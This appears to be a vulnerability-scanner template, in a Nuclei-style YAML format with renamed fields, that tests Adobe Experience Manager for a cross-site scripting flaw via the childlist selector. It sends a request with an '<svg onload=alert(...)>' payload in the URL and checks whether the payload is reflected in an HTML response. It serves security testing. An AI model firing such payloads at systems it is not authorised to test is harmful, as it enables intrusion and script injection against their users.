id: aem-xss-childlist-selector
brief:
    title: Adobe Experience Manager - Cross-Site Scripting
    by: dhiyaneshDk
    level: high
    about: Adobe Experience Manager contains a cross-site scripting vulnerability via requests using the selector childlist when the dispatcher does not respect the content-type responded by AEM and flips fro...
    label:
        - xss
        - aem
        - adobe
        - misconfig
        - vuln
    score: CVSS:7.2
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/etc/designs/xh1x.childrenlist.json//<svg onload=alert(document.domain)>.html'
      signs:
        - "on": word
          has:
            - <svg onload=alert(document.domain)>
            - '{"path":"/etc/designs/xh1x.childrenlist.json'
          in: body
          need: all
        - "on": word
          has:
            - text/html
          in: header
          need: all
        - "on": status
          status:
            - 200
